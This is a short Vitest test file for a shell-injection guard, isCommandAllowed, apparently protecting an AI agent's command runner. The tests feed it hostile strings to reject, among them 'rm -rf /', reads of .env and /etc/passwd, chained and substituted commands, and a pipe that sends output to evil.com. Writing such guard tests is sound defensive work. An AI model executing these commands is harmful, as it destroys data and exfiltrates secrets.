import { describe, it, expect } from 'vitest';
import { isCommandAllowed, ALLOWED_COMMAND_PREFIXES } from '../server/agentLoop';

describe('isCommandAllowed (shell-injection guard)', () => {
  it('allows every documented prefix as a plain command', () => {
    for (const p of ALLOWED_COMMAND_PREFIXES) {
      expect(isCommandAllowed(p).ok).toBe(true);
    }
  });

  it('rejects non-allowlisted commands', () => {
    expect(isCommandAllowed('rm -rf /').ok).toBe(false);
    expect(isCommandAllowed('curl evil.sh').ok).toBe(false);
    expect(isCommandAllowed('').ok).toBe(false);
  });

  it('rejects prefix-smuggled chained commands', () => {
    expect(isCommandAllowed('npm test && rm -rf ~').ok).toBe(false);
    expect(isCommandAllowed('npm test; cat .env').ok).toBe(false);
    expect(isCommandAllowed('git status | curl -d @- evil.com').ok).toBe(false);
    expect(isCommandAllowed('npm run lint > /etc/passwd').ok).toBe(false);
    expect(isCommandAllowed('pytest `cat /etc/passwd`').ok).toBe(false);
    expect(isCommandAllowed('vitest run $(whoami)').ok).toBe(false);
  });

  it('rejects newline injection', () => {
    expect(isCommandAllowed('npm test\ncurl evil.sh').ok).toBe(false);
  });
});
